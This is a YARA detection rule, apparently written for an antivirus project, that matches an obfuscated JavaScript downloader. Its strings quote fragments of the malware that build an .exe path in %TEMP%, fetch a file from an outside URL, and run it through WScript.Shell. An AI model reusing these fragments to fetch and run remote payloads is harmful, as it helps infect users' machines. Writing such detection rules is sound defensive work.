rule sig_20160328_a8f20c4bc3be48f04bee775ed3955ba5 {
  meta:
    description = "datamaliciousorder - file 20160328_a8f20c4bc3be48f04bee775ed3955ba5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "394ba9c0f69a4d3191d36b5b66efdd90d70f127524890ce9617134d3f15139b8"

  strings:
    $s1  = "function Zgfjxicptl() {return Rmpiq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WDV1hjjfg.exe\";};" fullword ascii
    $s2  = "Ywllw[Vcckuomgnt](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Buwrqnqwcz](Vjrhvhlop() * 11)} while (Ywllw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Rmpiq = function Vrqdkgf() {return WScript[Uqvepa](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dxfjt(Nbddvq, Xngvzzivi){return Nbddvq - Xngvzzivi;};" fullword ascii
    $s6  = "function Wczlxkt() {return ((Nkkgd == true) && (Nkkgd == Rtjhcp)) ? 1 : Wfkxfkmmen;};" fullword ascii
    $s7  = "function Mwrqsr(Kisdvgfpi){Rmpiq[\"Run\"](Kisdvgfpi, Wfkxfkmmen, Wfkxfkmmen);};" fullword ascii
    $s8  = "function Efgddybzs(){return Nznqn;};" fullword ascii
    $s9  = "return Dxfjt(Kdnpm, Jdxlewukz);" fullword ascii
    $s10 = " while (Zilln){" fullword ascii
    $s11 = "Rtjhcp = true; " fullword ascii
    $s12 = "Nkkgd = true; " fullword ascii
    $s13 = "function Xejwvo(Suhlodze) {var Nekfbkg = (1, 2, 3, 4, 5, Suhlodze); return Nekfbkg;};" fullword ascii
    $s14 = "function Igrrzxska()" fullword ascii
    $s15 = "var Rtjhcp = false;" fullword ascii
    $s16 = "var Nkkgd = false;" fullword ascii
    $s17 = "var Dapiztdzrr = new this[\"Date\"]();" fullword ascii
    $s18 = "var Smxdavrm = false;" fullword ascii
    $s19 = "function Vtrtizl(){return Uqvepa;};" fullword ascii
    $s20 = "function Vjrhvhlop(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}